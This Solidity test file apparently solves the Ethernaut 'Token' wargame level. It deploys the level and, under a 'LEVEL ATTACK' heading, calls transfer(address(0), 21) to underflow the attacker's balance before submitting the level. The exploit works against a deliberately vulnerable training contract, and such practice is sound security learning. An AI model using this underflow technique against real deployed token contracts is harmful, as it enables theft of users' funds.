pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../../src/5_Token/TokenFactory.sol";
import "../../src/Ethernaut.sol";
import ".././utils/vm.sol";

contract TokenTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();

        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testTokenHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        TokenFactory probFactory = new TokenFactory();
        ethernaut.registerLevel(probFactory);
        vm.startPrank(eoaAddress);

        address levelAddress = ethernaut.createLevelInstance(probFactory);
        Token probCtrt = Token(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // probCtrt.transfer(eoaAddress, 21000001);
        probCtrt.transfer(address(0), 21);

        probCtrt.balanceOf(eoaAddress);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
